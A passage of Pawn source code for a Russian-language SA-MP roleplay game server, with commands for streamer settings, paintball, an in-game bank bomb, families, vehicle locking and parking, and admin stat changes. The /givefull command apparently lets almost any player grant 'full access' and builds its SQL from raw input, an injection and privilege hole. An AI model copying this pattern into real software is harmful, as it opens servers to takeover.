	MoveDynamicObject(door_bank, 523.48853, 657.67596, 3590.58057, 3.0, 0.00000, 0.00000, -20.46001);

	SendClientMessage(playerid, C_OSNOV, "Вы успешно восстановили дверь в банке");

	return 1;
}

CMD:st_set(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;

	if(!strlen(params))
	{
		SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [set_type (1-6)]");

		SendClientMessage(playerid, 0xCECECEFF, "1. Streamer_SetTickRate(rate)");
		SendClientMessage(playerid, 0xCECECEFF, "2. Streamer_SetMaxItems(type, items)");
		SendClientMessage(playerid, 0xCECECEFF, "3. Streamer_SetVisibleItems(type, items, playerid = -1)");
		SendClientMessage(playerid, 0xCECECEFF, "4. Streamer_SetRadiusMultiplier(type, Float:multiplier, playerid = -1)");
		SendClientMessage(playerid, 0xCECECEFF, "5. Streamer_SetCellDistance(Float:distance)");
		SendClientMessage(playerid, 0xCECECEFF, "6. Streamer_SetCellSize(Float:size)");
		SendClientMessage(playerid, 0xCECECEFF, "7. Streamer_ProcessActiveItems()");

		return 1;
	}
	extract params -> new set_type;

	new type, value, to_player, Float: f_value;
	new fmt_msg[90];

	switch(set_type)
	{
		case 1:
		{
			if(sscanf(params, "{d}d", value)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [1] [rate]");
			Streamer_SetTickRate(value);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetTickRate(%d);", value);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 2:
		{
			if(sscanf(params, "{d}dd", type, value)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [2] [type] [items]");
			Streamer_SetMaxItems(type, value);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetMaxItems(%d, %d);", type, value);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 3:
		{
			if(sscanf(params, "{d}ddd", type, value, to_player)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [3] [type] [items] [playerid]");
			if(!(0 <= to_player <= MAX_PLAYERS))
				to_player = -1;

			Streamer_SetVisibleItems(type, value, to_player);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetVisibleItems(%d, %d, %d);", type, value, to_player);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 4:
		{
			if(sscanf(params, "{d}dfd", type, f_value, to_player)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [4] [type] [(Float) multiplier] [playerid]");
			if(!(0 <= to_player <= MAX_PLAYERS))
				to_player = -1;

			Streamer_SetRadiusMultiplier(type, f_value, to_player);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetRadiusMultiplier(%d, %f, %d);", type, f_value, to_player);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 5:
		{
			if(sscanf(params, "{d}f", f_value)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [5] [(Float) distance]");

			Streamer_SetCellDistance(f_value);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetCellDistance(%f);", f_value);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 6:
		{
			if(sscanf(params, "{d}f", f_value)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /st_set [6] [(Float) size]");

			Streamer_SetCellSize(f_value);

			format(fmt_msg, sizeof fmt_msg, "Streamer_SetCellSize(%f);", f_value);
			SendClientMessage(playerid, 0xCECECEFF, fmt_msg);
		}
		case 7:
		{
			Streamer_ProcessActiveItems();
			SendClientMessage(playerid, 0xCECECEFF, "Streamer_ProcessActiveItems();");
		}
		default: return SendClientMessage(playerid, 0xFF6600FF, "INVALID_SET_TYPE_ID");
	}

	return 1;
}

CMD:givefull(playerid, params[])
{
	if(GetString(GetName(playerid), "Artemy_Kovalevsky") || GetString(GetName(playerid), "Gambler"))

	return 1;
	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /givefull [ник игрока]");

	if(strlen(params) > MAX_PLAYER_NAME)
		return SendClientMessage(playerid, -1, "Вы ввели неверную длину ника");

	STRING_GLOBAL[0] = EOS;

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO fullaccess (name) VALUES ('%s')", params);
	mysql_query(dbHandle, STRING_GLOBAL);

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s был успешно выдан полный доступ", params);
	SendClientMessage(playerid, 0xFFCC00FF, STRING_GLOBAL);
	return 1;
}

CMD:startpb2(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;
	g_paintball_info[PB_TEAM_KILLS][0] =
	g_paintball_info[PB_TEAM_KILLS][1] = 29;
	return 1;
}

CMD:startpb1(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7) return 1;
	g_paintball_info[PB_STATUS] = 2;

	new bool: team[2] = false;

	foreach(new i: Player)
	{
		if(PI[i][P_PB_TEAM] == 0) team[0] = true;
		if(PI[i][P_PB_TEAM] == 1) team[1] = true;
	}

	if(team[0] == false || team[1] == false)
		return StopPaintBall(0, -1);

	SendClientMessageToAll(C_OSNOV, "Уважаемые игроки! Матч по пейнтболлу начался!");

	if(g_paintball_info[PB_VOTE][0] > g_paintball_info[PB_VOTE][1])
	{
		g_paintball_info[PB_MAP] = 0;
	}
	else
	{
		g_paintball_info[PB_MAP] = 1;
	}

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Карта: %s", g_paintball_map_name[g_paintball_info[PB_MAP]]);
	SendClientMessageToAll(C_OSNOV, STRING_GLOBAL);

	StartPaintball();

	return 1;
}

CMD:startpb(playerid, params[])
{
	if(PI[playerid][pAdmin] < 4)
		return 1;

	SendClientMessageToAll(C_OSNOV, " Уважаемые игроки! Начало пейнтболла через 3 минуты!");
	SendClientMessageToAll(C_OSNOV, " Место проведения пейнтболла: /gps > 9 > 4");
	SendClientMessageToAll(C_OSNOV, " Команда победителей получит 25000 рублей!");

	g_paintball_info[PB_STATUS] = 1;
	return 1;
}

CMD:test5(playerid, params[])
{
	for(new idx; idx < 28; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);
	for(new idx; idx < 3; idx ++) PlayerTextDrawShow(playerid, sto_td_player[idx][playerid]);
	SelectTextDraw(playerid, -1);
	return 1;
}

CMD:test3(playerid)
{
	if(PI[playerid][pAdmin] < 2)
		return 1;

	ShowPlayerHousesDialog(playerid);
	return 1;
}

CMD:test2(playerid)
{
	if(PI[playerid][pAdmin] < 2)
		return 1;

	LoadPlayerDialogSetting(playerid);
	ShowPlayerDialogSetting(playerid);

	return 1;
}

CMD:test1(playerid)
{
	if(PI[playerid][pAdmin] < 2)
		return 1;

	ShowPlayerMenuColors(playerid);
	return 1;
}

CMD:buybomb(playerid, params[])
{
	if(IsPlayerInDynamicArea(playerid, AreaBuyBomb))
	{
		if(TEAM_GROOVE <= PI[playerid][pMember] <= TEAM_BALLAS || TEAM_OPG1 <= PI[playerid][pMember] <= TEAM_RSM)
		{
			if(PI[playerid][pRank] >= 9)
			{
				if(PI[playerid][P_BOMB] == 0)
				{
					if(GetMoney(playerid) > BOMB_PRICE)
					{
						PI[playerid][P_BOMB] = 1;

						SendClientMessage(playerid, C_OSNOV, "Вы приобрели бомбу. Для закладки используйте: /bomb");

						GiveMoney(playerid, -BOMB_PRICE);
					}
					else SendMess(playerid, MSG_NOT_MONEY);
				}
				else SendClientMessage(playerid, C_RED, "У Вас уже есть бомба");
			}
			else SendClientMessage(playerid, C_RED, "Покупка бомбы доступна только заместителю или лидеру банды");
		}
		else SendClientMessage(playerid, C_RED, "Покупать бомбу могут только участники ОПГ и мафий");
	}
	return 1;
}

CMD:bomb(playerid, params[])
{
	if(IsPlayerInDynamicArea(playerid, AreaExplosionBomb))
	{
		if(TEAM_GROOVE <= PI[playerid][pMember] <= TEAM_BALLAS || TEAM_OPG1 <= PI[playerid][pMember] <= TEAM_RSM)
		{
			if(PI[playerid][pRank] >= 9)
			{
				if(PI[playerid][P_BOMB] == 1)
				{
					switch(door_bank_status)
					{
						case 0:
						{
							SetTimer("ExplosionDoor", 10_000, false);
							SendClientMessage(playerid, C_OSNOV, "Вы заложили бомбу. Она взорвется через 10 секунд.");
							PI[playerid][P_BOMB] = 0;
						}
						case 1:
						{
							SendClientMessage(playerid, C_RED, "Банк в этом часу уже грабили");
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "У Вас нет бомбы");
			}
			else SendClientMessage(playerid, C_RED, "Закладка бомбы доступна только заместителю или лидеру банды");
		}
		else SendClientMessage(playerid, C_RED, "Закладывать бомбу могут только участники ОПГ и мафий");
	}
	return 1;
}

/*CMD:gang_create(playerid)
{
    if(!GetPlayerFam(playerid) || GetPlayerFamRankEx(playerid) < 5) return SendClientMessage(playerid, 0xFF6600FF, "Вам не доступна функция");
    new fam = GetPlayerFam(playerid);
    if(g_family[fam][F_GANG] != 0) return SendClientMessage(playerid, 0xFF6600FF, "У вас и так уже банда");
    Dialog(playerid, DIALOG_CREATE_GANG, DIALOG_STYLE_MSGBOX, "Улучшение семьи", "Вы действительно хотите превраить семью в банду?\nСтоимость составит - 5.000.000 рублей", "Далее", "Отмена");
    return 1;
}*/
CMD:createfamily(playerid)
{
	if(PI[playerid][P_FAMILY] != 0)
		return SendClientMessage(playerid, C_RED, "Вы уже состоите в семье / у Вас есть семья");

	ShowPlayerDialog
	(
		playerid, DIALOG_FAMILY_CREATE, DIALOG_STYLE_INPUT,
		"{f6e58d}Создание семьи",
		"{FFFFFF}Введите название семьи в окно ниже\n\n"\
		"\t{f6e58d}Примечания:\n"\
		"\t- Название может состоять из русских и латинских символов\n"\
		"\t- Название чувствительно к регистру\n"\
		"\t- Длина названияот 6-ти до 30-ти символов\n\n"\
		"{ffffff}В названии Вы можете использовать выделения цветами, для этого воспользуйтесь\n"\
		"кодами цветов ниже:\n\n"\
		"\tБелый: {cecece}\"{\"ffffff} {ffffff}(БЕЗ КОВЫЧЕК)\n"\
		"\t{e74c3c}Красный: {cecece}\"{\"e74c3c} {ffffff}(БЕЗ КОВЫЧЕК)\n"\
		"\t{2ecc71}Зеленый: {cecece}\"{\"2ecc71} {ffffff}(БЕЗ КОВЫЧЕК)\n"\
		"\t{3498db}Синий: {cecece}\"{\"3498db} {ffffff}(БЕЗ КОВЫЧЕК)\n"\
		"\t{f1c40f}Желтый: {cecece}\"{\"f1c40f} {ffffff}(БЕЗ КОВЫЧЕК)\n"\
		"\t{9b59b6}Фиолетовый: {cecece}\"{\"9b59b6} {ffffff}(БЕЗ КОВЫЧЕК)\n\n",
		"Далее", ""
	);

	return 1;
}
CMD:family(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	STRING_GLOBAL[0] = EOS;

	strcat(STRING_GLOBAL, "1. Информация о семье\n");
	strcat(STRING_GLOBAL, "2. Состав семьи онлайн\n");
	strcat(STRING_GLOBAL, "3. Состав семьи оффлайн\n");
	strcat(STRING_GLOBAL, "4. Изменить цвет чата\n");
	strcat(STRING_GLOBAL, "5. Покинуть семью\n");

	if(GetFamilyData(familyid-1, F_OWNED) == PI[playerid][pID])
	{
		strcat(STRING_GLOBAL, "6. Изменить спавн семьи\n");
	}

	if(GetFamilyData(familyid-1, F_OWNED) == PI[playerid][pID])
	{
		strcat(STRING_GLOBAL, "7. Заказать продукты\n");
	}

	ShowPlayerDialog
	(
		playerid, DIALOG_FAMILY, DIALOG_STYLE_LIST,
		"{ffcc00}Меню семьи",
		STRING_GLOBAL,
		"Далее", "Отмена"
	);

	return 1;
}
CMD:lock(playerid, params[])
{
	if(TextResetCMD[playerid] > gettime()) return SendClientMessage(playerid, COLOR_GREY, ""cER"Не флуди");
    if(sscanf(params,"i",params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /lock [1 - личный автомобиль | 2 - арендованный автомобиль | 3 - личный вертолет]");
	if(params[0] < 1 || params[0] > 3) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /lock [1 - личный автомобиль | 2 - арендованный автомобиль | 3 - личный вертолет]");
	if(params[0] == 1)
	{
		if(!GetPlayerOwnableCar(playerid))
			return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

		for(new i; i < MAX_PLAYER_OWNABLE_CARS; i ++)
		{
			new vehicleid = PI[playerid][P_OWNABLE_CAR][i];

			new Float: posX, Float: posY, Float: posZ;

			GetVehiclePos(vehicleid, posX, posY, posZ);

			if(PlayerToPoint(3.0, playerid, posX, posY, posZ))
			{
				if(GetVehicleData(vehicleid, veh_owner_id) == playerid)
				{
					if(GetVehicleData(vehicleid, veh_locked) == false)
					{
						SetVehicleData(vehicleid, veh_locked, bool: true);
						CarDoors(vehicleid, g_vehicle[vehicleid][veh_locked]);
						GameTextForPlayer(playerid, "~w~ABTOMOЂ…‡’ ~n~~r~€AKP‘T",1000,3);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						MeAction(playerid, "достал ключи и закрыл транспорт");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE `ownable_cars` SET `lock`='%d' WHERE `id` = '%d'", g_vehicle[vehicleid][veh_locked], g_vehicle[vehicleid][veh_sql_id]);
						mysql_query(dbHandle, STRING_GLOBAL);

						return 1;
					}
					else
					{
						SetVehicleData(vehicleid, veh_locked, bool: false);
						CarDoors(vehicleid, g_vehicle[vehicleid][veh_locked]);
						GameTextForPlayer(playerid, "~w~ABTOMOЂ…‡’ ~n~~g~OTKP‘T",1000,3);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						MeAction(playerid, "достал ключи и открыл транспорт");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE `ownable_cars` SET `lock`='%d' WHERE `id` = '%d'", g_vehicle[vehicleid][veh_locked], g_vehicle[vehicleid][veh_sql_id]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
				}

				break;
			}
		}
	}
	if(params[0] == 2)
	{
	 	if(PI[playerid][TruckerCarID] == INVALID_VEHICLE_ID) return SendClientMessage(playerid, C_RED, "Вы не арендуете транспорт");

		new vehicleid = PI[playerid][TruckerCarID];

		if(!IsValidVehicle(vehicleid)) return 1;

		new Float: posX, Float: posY, Float: posZ;
		GetVehiclePos(vehicleid, posX, posY, posZ);
		if(!IsPlayerInRangeOfPoint(playerid, 10.0, posX, posY, posZ)) return SendClientMessage(playerid, C_RED, "Вы должны находиться возле арендованного Вами транспорта");
		if(GetVehicleData(vehicleid, veh_locked) == false)
		{
			SetVehicleData(vehicleid, veh_locked, true);
			CarDoorsEx(vehicleid, 1);
			GameTextForPlayer(playerid, "~r~locked", 2000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			MeAction(playerid, "достал ключи и закрыл транспорт");
		}
		else
		{
			SetVehicleData(vehicleid, veh_locked, false);
			CarDoorsEx(vehicleid, 0);
			GameTextForPlayer(playerid, "~g~unlocked", 2000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			MeAction(playerid, "достал ключи и открыл транспорт");
		}
	}
	if(params[0] == 3)
	{
		new rows;
		new fmt_query[128];
		new Cache: result;

		mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM copters WHERE owner_name='%s'", GetName(playerid));
		result = mysql_query(dbHandle, fmt_query);

		rows = cache_num_rows();

		if(!rows)
			return SendClientMessage(playerid, C_RED, "У Вас нет личного вертолета"), cache_delete(result);

		if(PI[playerid][PlayerCopterID] == INVALID_VEHICLE_ID)
			return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Ваш вертолет не загружен, используйте: /fixcopter");

		new Float: posX, Float: posY, Float: posZ, vehicleid = PI[playerid][PlayerCopterID];

		GetVehiclePos(vehicleid, posX, posY, posZ);

		if(PlayerToPoint(3.0, playerid, posX, posY, posZ))
	    {
			if(GetVehicleData(vehicleid, veh_locked) == false)
			{
				SetVehicleData(vehicleid, veh_locked, true);
				CarDoors(vehicleid, true);
				GameTextForPlayer(playerid, "~w~ABTOMOЂ…‡’ ~n~~r~€AKP‘T",1000,3);
				PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
				MeAction(playerid, "достал ключи и закрыл транспорт");

				format(fmt_query, sizeof fmt_query, "UPDATE `copters` SET `lock` = '1' WHERE `owner_name` = '%s'", GetName(playerid));
				mysql_query(dbHandle, fmt_query);

				return true;
			}
			else
			{
				SetVehicleData(vehicleid, veh_locked, false);
				CarDoors(vehicleid, false);
				GameTextForPlayer(playerid, "~w~ABTOMOЂ…‡’ ~n~~g~OTKP‘T",1000,3);
				PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
				MeAction(playerid, "достал ключи и открыл транспорт");

				format(fmt_query, sizeof fmt_query, "UPDATE `copters` SET `lock` = '0' WHERE `owner_name` = '%s'", GetName(playerid));
				mysql_query(dbHandle, fmt_query);
			}
		}
	}
	return 1;
}
CMD:findcar(playerid, params[])
{
	if(!GetPlayerOwnableCar(playerid))
		return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

	ShowPlayerListOwnbaleCar(playerid, DIALOG_FIND_CAR);
	return 1;
}

CMD:parkcopter(playerid, params[])
{
	new rows;
	new fmt_query[190];
	new Cache: result;

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM copters WHERE owner_name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(!rows)
		return SendClientMessage(playerid, C_RED, "У Вас нет личного вертолета"), cache_delete(result);

	if(PI[playerid][PlayerCopterID] == INVALID_VEHICLE_ID)
		return SendClientMessage(playerid, C_RED, "Ваш вертолет не загружен, используйте: /fixcopter");

	if(GetPlayerVehicleID(playerid) == PI[playerid][PlayerCopterID])
	{
		new Float: X, Float: Y, Float: Z, Float: R;

		new vehid = PI[playerid][PlayerCopterID];
		GetVehiclePos(vehid, X, Y, Z);
		GetVehicleZAngle(vehid, R);
		g_vehicle[vehid][veh_x] = X;
		g_vehicle[vehid][veh_y] = Y;
		g_vehicle[vehid][veh_z] = Z;
		g_vehicle[vehid][veh_a] = R;

		format(fmt_query, sizeof fmt_query, "UPDATE copters SET pos_x=%f, pos_y=%f, pos_z=%f, pos_r=%f WHERE owner_name='%s'", X, Y, Z, R, GetName(playerid));
		mysql_query(dbHandle, fmt_query);

		SendClientMessage(playerid, C_OSNOV, "Вы успешно припарковали вертолет");
	}
	else SendClientMessage(playerid, C_RED, "Вы должны находиться в вертолете");

	cache_delete(result);

	return 1;
}

CMD:park(playerid, params[])
{
	if(!GetPlayerOwnableCar(playerid))
		return SendClientMessage(playerid, C_RED, "У Вас нет личного транспорта");

	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,C_RED,"Нужно находиться в автомобиле");
	if(NoParking(playerid)) return SendClientMessage(playerid, C_RED, "Здесь запрещено парковать машину!");

	new Float: X, Float: Y, Float: Z, Float: R, h = GetPVarInt(playerid, "PlayerHouse");

	new vehicleid = GetPlayerVehicleID(playerid);

	GetVehiclePos(vehicleid, X, Y, Z);
	GetVehicleZAngle(vehicleid, R);
	g_vehicle[vehicleid][veh_x] = X;
	g_vehicle[vehicleid][veh_y] = Y;
	g_vehicle[vehicleid][veh_z] = Z;
	g_vehicle[vehicleid][veh_a] = R;

	if(GetVehicleData(vehicleid, veh_owner_id) == playerid)
	{
	    new garage_id = GetPVarInt(playerid, "in_garage");

	    if(garage_id != 0)
	    {
			SetVehicleData(vehicleid, veh_virtual, g_garages[garage_id][G_SQL_ID] + 1000);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET pos_x='%4.4f', pos_y='%4.4f', pos_z='%4.4f', pos_r='%4.4f', `virtual`=%d WHERE id=%d", X, Y, Z, R, g_vehicle[vehicleid][veh_virtual], g_vehicle[vehicleid][veh_sql_id]);
			mysql_query(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш личный транспорт №%d успешно припаркован в гараже №%d", g_vehicle[vehicleid][veh_slot], g_garages[garage_id][G_SQL_ID]);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
	    }

		else if(IsPlayerInRangeOfPoint(playerid, 15.0, -1618.8967,1577.9028,2005.5228))
		{
			SetVehicleData(vehicleid, veh_virtual, HouseInfo[h][hVirtual]);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET pos_x=%4.4f, pos_y=%4.4f, pos_z=%4.4f, pos_r=%4.4f, `virtual`=%d WHERE id=%d", X, Y, Z, R, HouseInfo[h][hVirtual], g_vehicle[vehicleid][veh_sql_id]);
			mysql_query(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш личный транспорт №%d успешно припаркован в доме", g_vehicle[vehicleid][veh_slot]);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
		}
		else
		{
			SetVehicleData(vehicleid, veh_virtual, 0);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET pos_x=%4.4f, pos_y=%4.4f, pos_z=%4.4f, pos_r=%4.4f, `virtual`=0 WHERE id=%d", X, Y, Z, R, g_vehicle[vehicleid][veh_sql_id]);
			mysql_query(dbHandle, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш личный транспорт №%d успешно припаркован на этом месте", g_vehicle[vehicleid][veh_slot]);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
		}
	}

	return 1;
}

CMD:findcopter(playerid, params[])
{
	new rows;
	new fmt_query[90];
	new Cache: result;

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM copters WHERE owner_name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(!rows)
		return SendClientMessage(playerid, C_RED, "У Вас нет личного вертолета"), cache_delete(result);

	if(PI[playerid][PlayerCopterID] == INVALID_VEHICLE_ID)
		return SendClientMessage(playerid, 0xFFCC00FF, "Ваш вертолет не загружен, используйте: /fixcopter");

	new Float: X, Float: Y, Float: Z, locname[20];

	GetVehiclePos(PI[playerid][PlayerCopterID], X, Y, Z);

	locname = "Личный вертолет";
	GPSPlayer_(playerid, X, Y, Z, locname);

	return 1;
}

CMD:sethp(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sethp [ID] [кол-во жизней]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 100 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Количество жизней от 0 до 100!");
	PI[params[0]][pHeal] = params[1];
	PI[params[0]][pHealthS] = params[1];
	SetHealth(params[0], params[1]);
	new string[128];
	format(string, sizeof(string), "Администратор %s[%d] изменил Вам показатель здоровья на %i", GetName(playerid), playerid, params[1]);
	SendClientMessage(params[0], COLOR_WHITE, string);
	format(string, sizeof(string), "[A] %s[%d] изменил показатель здоровья игроку %s[%d] на %i", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:sethunger(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sethunger [ID] [кол-во сытости]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 100 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Количество сытости от 0 до 100!");
	SetHunger(params[0], params[1]);
	MysqlUpdatePlayerInt(params[0], "hunger", PI[params[0]][pHunger]);
	new string[128];
	format(string, sizeof(string), "Администратор %s[%d] изменил Вам показатель сытости на %i", GetName(playerid), playerid, params[1]);
	SendClientMessage(params[0], COLOR_WHITE, string);
	format(string, sizeof(string), "[A] %s[%d] изменил показатель сытости игроку %s[%d] на %i", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:setam(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setam [ID] [кол-во брони]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] > 100 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Количество брони от 0 до 100!");
	SetPlayerArmour(params[0], params[1]);
	new string[128];
	format(string, sizeof(string), "Администратор %s[%d] изменил Вам показатель брони на %i", GetName(playerid), playerid, params[1]);
	SendClientMessage(params[0], COLOR_WHITE, string);
	format(string, sizeof(string), "[A] %s[%d] изменил показатель брони игроку %s[%d] на %i", GetName(playerid), playerid, GetName(params[0]), params[0], params[1]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:cc(playerid) return callcmd::clearchat(playerid);
CMD:clearchat(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    for(new i = 0; i < 100; i++) SendClientMessageToAll(COLOR_WHITE, "");
    new string[100];//краш
	format(string, sizeof(string),  "[A] %s[%i] очистил чат",GetName(playerid),playerid);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:object(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /object [id игрока]");
	else if(PlayerLogged[params[0]] == false) return 1;
 	objectplayerid = params[0];
	ShowPlayerDialog(playerid,8420,DIALOG_STYLE_LIST,"Выдать объект игроку","1. Шляпа курицы\n2. Огонек на голову\n3. Мигалка на голову\n4. Черная маска\n5. Бандана №1\n6. Бандана №2\n7. Бандана №3\n8. Бандана №4\n9. Бандана №5\n10. Маска дракона\n11. Лазер на голову\n12. Комплект всемогущий\n13. Попугай на плечо\n14. Яркий свет\n15. Большой М4 в руку\n16. Пенис\n17. Костюм попугая\n18. Удалить все объекты","Выбрать","Закрыть");
	return 1;
}

CMD:setcar(playerid, params[])
{
	if(PI[playerid][pAdmin] < 7)
		return 1;

	extract params -> new to_player, model_car, slot, color1, color2; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setcar [ид игрока] [ид авто] [слот (1/2/3/4)] [цвет 1] [цвет 2] ");

	if(to_player == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, C_RED, "Такого игрока нет");

	if(!(400 <= model_car <= 611))
		return SendClientMessage(playerid, C_RED, "Ид авто от 400 до 611");

	if(!(1 <= slot <= 4))
		return SendClientMessage(playerid, C_RED, "Слот от 1 до 4");

	if(!(0 <= color1 <= 255 || 0 <= color2 <= 255))
		return SendClientMessage(playerid, C_RED, "Цвет от 0 до 255");

	new rows;
	new fmt_query[300];
	new Cache: result;

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM ownable_cars WHERE owner_name='%s' AND slot=%d", GetName(to_player), slot);
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(rows)
	{
		new vehicleid = PI[playerid][P_OWNABLE_CAR][slot-1];
		if(vehicleid != INVALID_VEHICLE_ID)
		{
